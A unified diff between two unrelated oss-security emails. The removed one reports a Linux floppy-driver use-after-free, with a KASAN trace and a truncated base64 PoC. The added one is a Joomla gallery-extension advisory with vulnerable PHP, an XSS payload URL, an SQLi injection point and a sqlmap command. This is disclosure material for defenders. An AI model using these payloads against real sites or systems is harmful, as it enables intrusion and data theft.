@@ -1,4 +1,9 @@
-Received: (qmail 7268 invoked by uid 550); 28 Apr 2022 08:36:27 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6142" "Saturday" "23" "July" "2016" "14:59:16" "+0000" "Larry W. Cashdollar" "larry0@me.com" "<5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>" "123" "[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla" nil nil nil "7" "2016072314:59:16" "[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla" (number mark "U       larry0@me.co Jul 23  123/6142  " thread-indent "\"[oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 1487 invoked by uid 550); 23 Jul 2016 15:00:15 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,398 +12,154 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 27950 invoked from network); 28 Apr 2022 03:20:33 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=mime-version:from:date:message-id:subject:to;
-        bh=DcusJc2+k/5PpIgeLXyIrSYGcm/4Bf0IUvNfADJFb3A=;
-        b=ctLEh6915Z3VyWQWvAy+V7AKLLcn5gjX/TB4hn22vyMxSQHUAvS0YKl2yUQ13Yo0Hj
-         BTNojpo6Vtph/tAP4mtOnksKbIgmJ3oBqHvUmMivGb4Fb9b7Vf1a4Qb9elRhHpu77rIC
-         ubWnT/Znui95xtSGeqDB9/RnmoLXv9d+ZeYJH3pRaVxI/ilVhal7TPdnVb3zuZmbHO6V
-         TP/kRHekbNDzzYEXGK+lutPb9ltPO7I+sQI5MXpSHzmEm6QUrnup/Ay43u1nVg5gEIVP
-         oH3hnOHnTYsXelUyXv8I8nKBZ9BnSM1LoqMWxFB1T4/EnHCIMsNQVyLZ/AOTszt2yL1Z
-         i7Ag==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
-        bh=DcusJc2+k/5PpIgeLXyIrSYGcm/4Bf0IUvNfADJFb3A=;
-        b=QBiQPIX6TRpLiQZMxvkktWgrRpxLt1MkGbDhVLr6gGBs3MWqAMLK1OO4dkFxa/iS06
-         NOyM3K7Xl2ASZMV4cG76WUKQurLYn7yNwcjUIRUdOyqx2xYC+46qaR0atHIpB3wr5fB5
-         Bfhdb728ODcWwugl1IoVvJrDHM5b+ZAFMDRfoOJJE0sU8PQ+3/K+mjhNjBj1PtvV2pDv
-         3+sHRrVYe7biwoyj5Sgjc9NtvxvPaqNrmqR9vV2ZtRwyT+y2/GaF8TT2rlSN0eQ46Oc9
-         KOh8G/oZm4VB//Wl9LJD9ME7kxLti6w1pc4zj8GRs2S9StqX/nVVy8Z2z0v0AndFHG2f
-         ldhg==
-X-Gm-Message-State: AOAM5323m9JQZmi+vSCekIfrj8qvUJ/9Alr4p/5sC2DyV3H3qlpjlT6t
-	8lS1AbYGjs8y2+ILwonx9Ba8IJda26TMCJZHZCwcXDArWBGALlwG
-X-Google-Smtp-Source: ABdhPJzLfyqt+SBE5dywaX00svQvwMZ7hrv0TA1WNsSjwKfOkMbccUofFIQQ1npG1MYabYqpLQ0UWs3YRC3QXs+s+04=
-X-Received: by 2002:a0d:cbce:0:b0:2f8:29f6:2839 with SMTP id
- n197-20020a0dcbce000000b002f829f62839mr10539281ywd.89.1651116021960; Wed, 27
- Apr 2022 20:20:21 -0700 (PDT)
-MIME-Version: 1.0
-From: Minh Yuan <yuanmingbuaa@gmail.com>
-Date: Thu, 28 Apr 2022 11:19:46 +0800
-Message-ID: <CAH5WSp4X9ZRsgV_NWt8tT1OGxa45MrKDTOikHtnkc78XO5MaxA@mail.gmail.com>
-To: oss-security@lists.openwall.com
-Content-Type: multipart/mixed; boundary="000000000000f8f89e05ddae67d8"
-Subject: [oss-security] Linux kernel: A concurrency use-after-free in floppy's raw_cmd
+Received: (qmail 32754 invoked from network); 23 Jul 2016 14:59:30 -0000
+X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
+ definitions=2016-07-23_12:,, signatures=0
+X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
+ clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
+ bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
+ engine=8.0.1-1510270003 definitions=main-1607230182
+MIME-version: 1.0
+Content-type: multipart/alternative;
+ boundary="Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)"
+To: Open Source Security <oss-security@lists.openwall.com>
+From: "Larry W. Cashdollar" <larry0@me.com>
+Date: Sat, 23 Jul 2016 14:59:16 +0000 (GMT)
+X-Mailer: iCloud MailClient16EProject70
+ MailServer16E78.25278-16A-1132-e21ea0a6a8b6
+X-Originating-IP: [108.176.228.3]
+Message-id: <5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
+	t=1469285957; bh=Ogt+Six38xlEPUaJyyhbX2ErOWIoxBB4EQ+Ro0Yc+ro=;
+	h=MIME-version:Content-type:To:From:Subject:Date:Message-id;
+	b=iYiD77D64nkB7bw4tD8G5k0AfpdQpd3mIgyZ9Na/gvegbBPGRPrPAUPp/6OmkH6xS
+ zEC1QJxePsFmatCT3qG3WQpsN+04P0txXhvoN/IEEx1Gnsp96eirtB4TCKV+TwVYLP
+ 8EDBBmFfWqVn2PpUPIH1SmyJHKZLG7G92LzwhkSdr+Fi7Zd0iOeW9wKvM00IvjDz02
+ moM7G8bHiXd1r/nobqc8sow9luXGvq79I76qGJNMh1fPJTGgUbrVxQnpkMmwrx+7pt
+ lUkRHZvIistu05bNCl7GZTWfrbcmYonFO8NH68ToRJeRHMOSfyR1gGON/CleedpZCN
+ CG//HCppHNcvw==
+Subject: [oss-security] XSS and SQLi in huge IT gallery v1.1.5 for Joomla
 
---000000000000f8f89e05ddae67d8
-Content-Type: multipart/alternative; boundary="000000000000f8f89c05ddae67d6"
+--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)
+Content-type: text/plain; charset=utf-8; format=flowed
+Content-transfer-encoding: quoted-printable
 
---000000000000f8f89c05ddae67d6
-Content-Type: text/plain; charset="UTF-8"
+Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+Fixed: v1.1.7
+Author: Larry W. Cashdollar, @_larry0 and Elitza Neytcheva, @ElitzaNeytcheva
+Date: 2016-07-14
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-i=
+mages/galleries/gallery-pro
+Vendor: huge-it.com
+Vendor Notified: 2016-07-15, fixed 2016-07-23
+Vendor Contact: info@huge-it.com
+Description: The plugin allows you to add multiple images to the gallery, c=
+reate countless galleries, add a description to each of them, as well as ma=
+ke the same things with video links.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access=
+ to the administrative panel to exploit this vulnerability:
 
-Hi,
-
-We recently discovered a concurrency uaf between raw_cmd_ioctl and
-seek_interrupt in the latest kernel version (5.17.4 for now).
-
-The root cause is that after deallocating raw_cmd in raw_cmd_ioctl,
-seek_interrupt still holds the freed raw_cmd and accesses it in
-floppy_ready or start_motor concurrently.
-
-PoC (generated by syzkaller) is in the attachment, and here is the KASAN
-report:
-
-BUG: KASAN: use-after-free in start_motor+0x31b/0x3f0
-drivers/block/floppy.c:1908
-
-Read of size 4 at addr ffff888127331c00 by task kworker/u16:9/15911
-
-CPU: 5 PID: 15911 Comm: kworker/u16:9 Not tainted 5.16.2 #20
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS
-rel-1.13.0-0-gf21b5a4aeb02-prebuilt.qemu.org 04/01/2014
-Workqueue: floppy floppy_work_workfn
-Call Trace:
- <TASK>
- __dump_stack lib/dump_stack.c:88 [inline]
- dump_stack_lvl+0xcd/0x134 lib/dump_stack.c:106
- print_address_description.constprop.0.cold+0x8d/0x320 mm/kasan/report.c:247
- __kasan_report mm/kasan/report.c:433 [inline]
- kasan_report.cold+0x83/0xdf mm/kasan/report.c:450
- start_motor+0x31b/0x3f0 drivers/block/floppy.c:1908
- floppy_ready+0x83/0x1850 drivers/block/floppy.c:1935
- seek_interrupt+0x326/0x420 drivers/block/floppy.c:1567
- process_one_work+0x9b2/0x1660 kernel/workqueue.c:2317
- worker_thread+0x65d/0x1130 kernel/workqueue.c:2465
- kthread+0x405/0x4f0 kernel/kthread.c:327
- ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:295
- </TASK>
-
-Allocated by task 22033:
- kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
- kasan_set_track mm/kasan/common.c:46 [inline]
- set_alloc_info mm/kasan/common.c:434 [inline]
- ____kasan_kmalloc mm/kasan/common.c:513 [inline]
- ____kasan_kmalloc mm/kasan/common.c:472 [inline]
- __kasan_kmalloc+0xa9/0xd0 mm/kasan/common.c:522
- kmalloc include/linux/slab.h:590 [inline]
- raw_cmd_copyin drivers/block/floppy.c:3100 [inline]
- raw_cmd_ioctl drivers/block/floppy.c:3167 [inline]
- fd_locked_ioctl+0x100e/0x2820 drivers/block/floppy.c:3535
- fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
- blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
- vfs_ioctl fs/ioctl.c:51 [inline]
- __do_sys_ioctl fs/ioctl.c:874 [inline]
- __se_sys_ioctl fs/ioctl.c:860 [inline]
- __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
- do_syscall_x64 arch/x86/entry/common.c:50 [inline]
- do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x44/0xae
-
-Freed by task 22033:
- kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
- kasan_set_track+0x21/0x30 mm/kasan/common.c:46
- kasan_set_free_info+0x20/0x30 mm/kasan/generic.c:370
- ____kasan_slab_free mm/kasan/common.c:366 [inline]
- ____kasan_slab_free mm/kasan/common.c:328 [inline]
- __kasan_slab_free+0xff/0x130 mm/kasan/common.c:374
- kasan_slab_free include/linux/kasan.h:235 [inline]
- slab_free_hook mm/slub.c:1723 [inline]
- slab_free_freelist_hook+0x8b/0x1c0 mm/slub.c:1749
- slab_free mm/slub.c:3513 [inline]
- kfree+0xf6/0x560 mm/slub.c:4561
- raw_cmd_free+0x8a/0x1c0 drivers/block/floppy.c:3086
- raw_cmd_ioctl drivers/block/floppy.c:3187 [inline]
- fd_locked_ioctl+0x206d/0x2820 drivers/block/floppy.c:3535
- fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
- blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
- vfs_ioctl fs/ioctl.c:51 [inline]
- __do_sys_ioctl fs/ioctl.c:874 [inline]
- __se_sys_ioctl fs/ioctl.c:860 [inline]
- __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
- do_syscall_x64 arch/x86/entry/common.c:50 [inline]
- do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x44/0xae
+SQL in code via id parameter:
+./administrator/components/com_gallery/models/gallery.php
+51 public function getPropertie() {
+52 $db =3D JFactory::getDBO();
+53 $id_cat =3D JRequest::getVar('id');
+54 $query =3D $db->getQuery(true);
+55 $query->select('#__huge_itgallery_images.name as name,'
+56 . '#__huge_itgallery_images.id ,'
+57 . '#__huge_itgallery_gallerys.name as portName,'
+58 . 'gallery_id, #__huge_itgallery_images.description as description,image=
+_url,sl_url,sl_type,link_target,#__huge_itg allery_images.ordering,#__huge_=
+itgallery_images.published,published_in_sl_width');
+59 $query->from(array('#__huge_itgallery_gallerys' =3D> '#__huge_itgallery_=
+gallerys', '#__huge_itgallery_images' =3D> '#__huge_itg allery_images'));
+60 $query->where('#__huge_itgallery_gallerys.id =3D gallery_id')->where('ga=
+llery_id=3D' . $id_cat);
+61 $query->order('ordering desc');
+62=20
+64 $db->setQuery($query);
+65 $results =3D $db->loadObjectList();
+66 return $results;
+67 }
 
 
-The new patch can been seen at
-https://github.com/torvalds/linux/commit/233087ca063686964a53c829d547c7571e3f67bf
-.
 
-Regards,
+XSS is here:
 
-Yuan Ming from Tsinghua University
+root@Joomla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET"=
+ {} \;
+./administrator/components/com_gallery/views/gallery/tmpl/default.php
+root@Joomla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET"=
+ {} \;
+256: <a class=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}"=
+ href=3D"index.php?option=3Dcom_gallery&view=3Dvideo&tmpl=3Dcomponent&pid=
+=3D<?php echo $_GET['id']; ?>" title=3D"Image" >
+CVE-2016-1000113 2016-1000114
+JSON: Export
+Exploit Code:
+XSS PoC
+http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
+llery&id=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
 
---000000000000f8f89c05ddae67d6
-Content-Type: text/html; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+SQLi PoC
+http://192.168.0.125/administrator/index.php?option=3Dcom_gallery&view=3Dga=
+llery&id=3DSQLiHERE
 
-<div dir=3D"ltr">Hi,<div><br><div>We recently discovered a concurrency uaf =
-between=C2=A0raw_cmd_ioctl and seek_interrupt in the latest kernel version =
-(5.17.4 for now).</div><div><br></div><div>The root cause is that after=C2=
-=A0deallocating=C2=A0<span style=3D"color:rgb(0,0,0);font-family:Menlo,Mona=
-co,&quot;Courier New&quot;,monospace;font-size:12px;white-space:pre-wrap">r=
-aw_cmd in </span>raw_cmd_ioctl, seek_interrupt still holds the freed=C2=A0<=
-span style=3D"color:rgb(0,0,0);font-family:Menlo,Monaco,&quot;Courier New&q=
-uot;,monospace;font-size:12px;white-space:pre-wrap">raw_cmd and accesses it=
- in floppy_ready or </span>start_motor concurrently.</div><div><br></div><d=
-iv>PoC (generated by syzkaller) is in the attachment, and here is the KASAN=
- report:</div><div><br></div><div><span style=3D"color:rgb(0,0,0);white-spa=
-ce:pre-wrap">BUG: KASAN: use-after-free in start_motor+0x31b/0x3f0 drivers/=
-block/floppy.c:1908</span><br></div><div><pre style=3D"white-space:pre-wrap=
-;color:rgb(0,0,0)">Read of size 4 at addr ffff888127331c00 by task kworker/=
-u16:9/15911
+$ sqlmap --load-cookies=3Dcookies.txt -u "http://192.168.0.125/administrato=
+r/index.php?option=3Dcom_gallery&view=3Dgallery&id=3D*" --dbms mysql
+Screen Shots:
+Advisory:=C2=A0http://www.vapidlabs.com/advisory.php?v=3D164=
 
-CPU: 5 PID: 15911 Comm: kworker/u16:9 Not tainted 5.16.2 #20
-Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS <a href=3D"http=
-://rel-1.13.0-0-gf21b5a4aeb02-prebuilt.qemu.org/" target=3D"_blank">rel-1.1=
-3.0-0-gf21b5a4aeb02-prebuilt.qemu.org</a> 04/01/2014
-Workqueue: floppy floppy_work_workfn
-Call Trace:
- &lt;TASK&gt;
- __dump_stack lib/dump_stack.c:88 [inline]
- dump_stack_lvl+0xcd/0x134 lib/dump_stack.c:106
- print_address_description.constprop.0.cold+0x8d/0x320 mm/kasan/report.c:247
- __kasan_report mm/kasan/report.c:433 [inline]
- kasan_report.cold+0x83/0xdf mm/kasan/report.c:450
- start_motor+0x31b/0x3f0 drivers/block/floppy.c:1908
- floppy_ready+0x83/0x1850 drivers/block/floppy.c:1935
- seek_interrupt+0x326/0x420 drivers/block/floppy.c:1567
- process_one_work+0x9b2/0x1660 kernel/workqueue.c:2317
- worker_thread+0x65d/0x1130 kernel/workqueue.c:2465
- kthread+0x405/0x4f0 kernel/kthread.c:327
- ret_from_fork+0x1f/0x30 arch/x86/entry/entry_64.S:295
- &lt;/TASK&gt;
+--Boundary_(ID_D4iF2YRamzmojCo0GymG7Q)
+Content-type: multipart/related;
+ boundary="Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)"; type="text/html"
 
-Allocated by task 22033:
- kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
- kasan_set_track mm/kasan/common.c:46 [inline]
- set_alloc_info mm/kasan/common.c:434 [inline]
- ____kasan_kmalloc mm/kasan/common.c:513 [inline]
- ____kasan_kmalloc mm/kasan/common.c:472 [inline]
- __kasan_kmalloc+0xa9/0xd0 mm/kasan/common.c:522
- kmalloc include/linux/slab.h:590 [inline]
- raw_cmd_copyin drivers/block/floppy.c:3100 [inline]
- raw_cmd_ioctl drivers/block/floppy.c:3167 [inline]
- fd_locked_ioctl+0x100e/0x2820 drivers/block/floppy.c:3535
- fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
- blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
- vfs_ioctl fs/ioctl.c:51 [inline]
- __do_sys_ioctl fs/ioctl.c:874 [inline]
- __se_sys_ioctl fs/ioctl.c:860 [inline]
- __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
- do_syscall_x64 arch/x86/entry/common.c:50 [inline]
- do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x44/0xae
 
-Freed by task 22033:
- kasan_save_stack+0x1e/0x50 mm/kasan/common.c:38
- kasan_set_track+0x21/0x30 mm/kasan/common.c:46
- kasan_set_free_info+0x20/0x30 mm/kasan/generic.c:370
- ____kasan_slab_free mm/kasan/common.c:366 [inline]
- ____kasan_slab_free mm/kasan/common.c:328 [inline]
- __kasan_slab_free+0xff/0x130 mm/kasan/common.c:374
- kasan_slab_free include/linux/kasan.h:235 [inline]
- slab_free_hook mm/slub.c:1723 [inline]
- slab_free_freelist_hook+0x8b/0x1c0 mm/slub.c:1749
- slab_free mm/slub.c:3513 [inline]
- kfree+0xf6/0x560 mm/slub.c:4561
- raw_cmd_free+0x8a/0x1c0 drivers/block/floppy.c:3086
- raw_cmd_ioctl drivers/block/floppy.c:3187 [inline]
- fd_locked_ioctl+0x206d/0x2820 drivers/block/floppy.c:3535
- fd_ioctl+0x35/0x50 drivers/block/floppy.c:3562
- blkdev_ioctl+0x37a/0x800 block/ioctl.c:609
- vfs_ioctl fs/ioctl.c:51 [inline]
- __do_sys_ioctl fs/ioctl.c:874 [inline]
- __se_sys_ioctl fs/ioctl.c:860 [inline]
- __x64_sys_ioctl+0x193/0x200 fs/ioctl.c:860
- do_syscall_x64 arch/x86/entry/common.c:50 [inline]
- do_syscall_64+0x35/0x80 arch/x86/entry/common.c:80
- entry_SYSCALL_64_after_hwframe+0x44/0xae</pre></div><div><br></div><div>Th=
-e new patch can been seen at=C2=A0<a href=3D"https://github.com/torvalds/li=
-nux/commit/233087ca063686964a53c829d547c7571e3f67bf">https://github.com/tor=
-valds/linux/commit/233087ca063686964a53c829d547c7571e3f67bf</a>.</div><div>=
-<br></div><div><div>Regards,</div><div>=C2=A0<br></div><div>Yuan Ming from =
-Tsinghua University</div></div></div></div>
+--Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)
+Content-type: text/html; CHARSET=US-ASCII
+Content-transfer-encoding: quoted-printable
 
---000000000000f8f89c05ddae67d6--
+<html><body><div>Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla <=
+/div><div>Fixed: v1.1.7<br>Author: Larry W. Cashdollar, @_larry0 and Elitza=
+ Neytcheva, @ElitzaNeytcheva<br>Date: 2016-07-14<br>Download Site: http://e=
+xtensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery=
+-pro<br>Vendor: huge-it.com<br>Vendor Notified: 2016-07-15, fixed 2016-07-2=
+3<br>Vendor Contact: info@huge-it.com<br>Description: The plugin allows you=
+ to add multiple images to the gallery, create countless galleries, add a d=
+escription to each of them, as well as make the same things with video link=
+s.<br>Vulnerability:<br>The attacker must be logged in with at least manage=
+r level access or access to the administrative panel to exploit this vulner=
+ability:<br><br>SQL in code via id parameter:<br>./administrator/components=
+/com_gallery/models/gallery.php<br>51 public function getPropertie() {<br>5=
+2 $db =3D JFactory::getDBO();<br>53 $id_cat =3D JRequest::getVar('id');<br>=
+54 $query =3D $db-&gt;getQuery(true);<br>55 $query-&gt;select('#__huge_itga=
+llery_images.name as name,'<br>56 . '#__huge_itgallery_images.id ,'<br>57 .=
+ '#__huge_itgallery_gallerys.name as portName,'<br>58 . 'gallery_id, #__hug=
+e_itgallery_images.description as description,image_url,sl_url,sl_type,link=
+_target,#__huge_itg allery_images.ordering,#__huge_itgallery_images.publish=
+ed,published_in_sl_width');<br>59 $query-&gt;from(array('#__huge_itgallery_=
+gallerys' =3D&gt; '#__huge_itgallery_gallerys', '#__huge_itgallery_images' =
+=3D&gt; '#__huge_itg allery_images'));<br>60 $query-&gt;where('#__huge_itga=
+llery_gallerys.id =3D gallery_id')-&gt;where('gallery_id=3D' . $id_cat);<br=
+>61 $query-&gt;order('ordering desc');<br>62 <br>64 $db-&gt;setQuery($query=
+);<br>65 $results =3D $db-&gt;loadObjectList();<br>66 return $results;<br>6=
+7 }<br><br><br><br>XSS is here:<br><br>root@Joomla:/var/www/html# find . -n=
+ame "*.php" -exec grep -l "echo \$_GET" {} \;<br>./administrator/components=
+/com_gallery/views/gallery/tmpl/default.php<br>root@Joomla:/var/www/html# f=
+ind . -name "*.php" -exec grep -n "echo \$_GET" {} \;<br>256: &lt;a class=
+=3D"modal" rel=3D"{handler: 'iframe', size: {x: 800, y: 500}}" href=3D"inde=
+x.php?option=3Dcom_gallery&amp;view=3Dvideo&amp;tmpl=3Dcomponent&amp;pid=3D=
+&lt;?php echo $_GET['id']; ?&gt;" title=3D"Image" &gt;<br>CVE-2016-1000113 =
+2016-1000114<br>JSON: Export<br>Exploit Code:<br>XSS PoC<br>http://192.168.=
+0.125/administrator/index.php?option=3Dcom_gallery&amp;view=3Dgallery&amp;i=
+d=3D1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E<br> <br>SQLi PoC<br>http=
+://192.168.0.125/administrator/index.php?option=3Dcom_gallery&amp;view=3Dga=
+llery&amp;id=3DSQLiHERE<br> <br>$ sqlmap --load-cookies=3Dcookies.txt -u "h=
+ttp://192.168.0.125/administrator/index.php?option=3Dcom_gallery&amp;view=
+=3Dgallery&amp;id=3D*" --dbms mysql<br>Screen Shots:<br>Advisory:&nbsp;http=
+://www.vapidlabs.com/advisory.php?v=3D164</div></body></html>=
 
---000000000000f8f89e05ddae67d8
-Content-Type: application/octet-stream; name="floppy_poc.c"
-Content-Disposition: attachment; filename="floppy_poc.c"
-Content-Transfer-Encoding: base64
-Content-ID: <f_l2iftpsq0>
-X-Attachment-Id: f_l2iftpsq0
+--Boundary_(ID_70JWip5QYKy/+4ep/e7oLA)--
 
-I2luY2x1ZGUgPGRpcmVudC5oPgojaW5jbHVkZSA8ZW5kaWFuLmg+CiNpbmNs
-dWRlIDxlcnJuby5oPgojaW5jbHVkZSA8ZmNudGwuaD4KI2luY2x1ZGUgPHB0
-aHJlYWQuaD4KI2luY2x1ZGUgPHNpZ25hbC5oPgojaW5jbHVkZSA8c3RkYXJn
-Lmg+CiNpbmNsdWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4K
-I2luY2x1ZGUgPHN0ZGlvLmg+CiNpbmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1
-ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL3ByY3RsLmg+CiNpbmNsdWRl
-IDxzeXMvc3RhdC5oPgojaW5jbHVkZSA8c3lzL3N5c2NhbGwuaD4KI2luY2x1
-ZGUgPHN5cy90eXBlcy5oPgojaW5jbHVkZSA8c3lzL3dhaXQuaD4KI2luY2x1
-ZGUgPHRpbWUuaD4KI2luY2x1ZGUgPHVuaXN0ZC5oPgoKI2luY2x1ZGUgPGxp
-bnV4L2Z1dGV4Lmg+CgpzdGF0aWMgdm9pZCBzbGVlcF9tcyh1aW50NjRfdCBt
-cykKewogIHVzbGVlcChtcyAqIDEwMDApOwp9CgpzdGF0aWMgdWludDY0X3Qg
-Y3VycmVudF90aW1lX21zKHZvaWQpCnsKICBzdHJ1Y3QgdGltZXNwZWMgdHM7
-CiAgaWYgKGNsb2NrX2dldHRpbWUoQ0xPQ0tfTU9OT1RPTklDLCAmdHMpKQog
-ICAgZXhpdCgxKTsKICByZXR1cm4gKHVpbnQ2NF90KXRzLnR2X3NlYyAqIDEw
-MDAgKyAodWludDY0X3QpdHMudHZfbnNlYyAvIDEwMDAwMDA7Cn0KCnN0YXRp
-YyB2b2lkIHRocmVhZF9zdGFydCh2b2lkKiAoKmZuKSh2b2lkKiksIHZvaWQq
-IGFyZykKewogIHB0aHJlYWRfdCB0aDsKICBwdGhyZWFkX2F0dHJfdCBhdHRy
-OwogIHB0aHJlYWRfYXR0cl9pbml0KCZhdHRyKTsKICBwdGhyZWFkX2F0dHJf
-c2V0c3RhY2tzaXplKCZhdHRyLCAxMjggPDwgMTApOwogIGludCBpID0gMDsK
-ICBmb3IgKDsgaSA8IDEwMDsgaSsrKSB7CiAgICBpZiAocHRocmVhZF9jcmVh
-dGUoJnRoLCAmYXR0ciwgZm4sIGFyZykgPT0gMCkgewogICAgICBwdGhyZWFk
-X2F0dHJfZGVzdHJveSgmYXR0cik7CiAgICAgIHJldHVybjsKICAgIH0KICAg
-IGlmIChlcnJubyA9PSBFQUdBSU4pIHsKICAgICAgdXNsZWVwKDUwKTsKICAg
-ICAgY29udGludWU7CiAgICB9CiAgICBicmVhazsKICB9CiAgZXhpdCgxKTsK
-fQoKdHlwZWRlZiBzdHJ1Y3QgewogIGludCBzdGF0ZTsKfSBldmVudF90OwoK
-c3RhdGljIHZvaWQgZXZlbnRfaW5pdChldmVudF90KiBldikKewogIGV2LT5z
-dGF0ZSA9IDA7Cn0KCnN0YXRpYyB2b2lkIGV2ZW50X3Jlc2V0KGV2ZW50X3Qq
-IGV2KQp7CiAgZXYtPnN0YXRlID0gMDsKfQoKc3RhdGljIHZvaWQgZXZlbnRf
-c2V0KGV2ZW50X3QqIGV2KQp7CiAgaWYgKGV2LT5zdGF0ZSkKICAgIGV4aXQo
-MSk7CiAgX19hdG9taWNfc3RvcmVfbigmZXYtPnN0YXRlLCAxLCBfX0FUT01J
-Q19SRUxFQVNFKTsKICBzeXNjYWxsKFNZU19mdXRleCwgJmV2LT5zdGF0ZSwg
-RlVURVhfV0FLRSB8IEZVVEVYX1BSSVZBVEVfRkxBRywgMTAwMDAwMCk7Cn0K
-CnN0YXRpYyB2b2lkIGV2ZW50X3dhaXQoZXZlbnRfdCogZXYpCnsKICB3aGls
-ZSAoIV9fYXRvbWljX2xvYWRfbigmZXYtPnN0YXRlLCBfX0FUT01JQ19BQ1FV
-SVJFKSkKICAgIHN5c2NhbGwoU1lTX2Z1dGV4LCAmZXYtPnN0YXRlLCBGVVRF
-WF9XQUlUIHwgRlVURVhfUFJJVkFURV9GTEFHLCAwLCAwKTsKfQoKc3RhdGlj
-IGludCBldmVudF9pc3NldChldmVudF90KiBldikKewogIHJldHVybiBfX2F0
-b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9NSUNfQUNRVUlSRSk7Cn0K
-CnN0YXRpYyBpbnQgZXZlbnRfdGltZWR3YWl0KGV2ZW50X3QqIGV2LCB1aW50
-NjRfdCB0aW1lb3V0KQp7CiAgdWludDY0X3Qgc3RhcnQgPSBjdXJyZW50X3Rp
-bWVfbXMoKTsKICB1aW50NjRfdCBub3cgPSBzdGFydDsKICBmb3IgKDs7KSB7
-CiAgICB1aW50NjRfdCByZW1haW4gPSB0aW1lb3V0IC0gKG5vdyAtIHN0YXJ0
-KTsKICAgIHN0cnVjdCB0aW1lc3BlYyB0czsKICAgIHRzLnR2X3NlYyA9IHJl
-bWFpbiAvIDEwMDA7CiAgICB0cy50dl9uc2VjID0gKHJlbWFpbiAlIDEwMDAp
-ICogMTAwMCAqIDEwMDA7CiAgICBzeXNjYWxsKFNZU19mdXRleCwgJmV2LT5z
-dGF0ZSwgRlVURVhfV0FJVCB8IEZVVEVYX1BSSVZBVEVfRkxBRywgMCwgJnRz
-KTsKICAgIGlmIChfX2F0b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9N
-SUNfQUNRVUlSRSkpCiAgICAgIHJldHVybiAxOwogICAgbm93ID0gY3VycmVu
-dF90aW1lX21zKCk7CiAgICBpZiAobm93IC0gc3RhcnQgPiB0aW1lb3V0KQog
-ICAgICByZXR1cm4gMDsKICB9Cn0KCnN0YXRpYyBib29sIHdyaXRlX2ZpbGUo
-Y29uc3QgY2hhciogZmlsZSwgY29uc3QgY2hhciogd2hhdCwgLi4uKQp7CiAg
-Y2hhciBidWZbMTAyNF07CiAgdmFfbGlzdCBhcmdzOwogIHZhX3N0YXJ0KGFy
-Z3MsIHdoYXQpOwogIHZzbnByaW50ZihidWYsIHNpemVvZihidWYpLCB3aGF0
-LCBhcmdzKTsKICB2YV9lbmQoYXJncyk7CiAgYnVmW3NpemVvZihidWYpIC0g
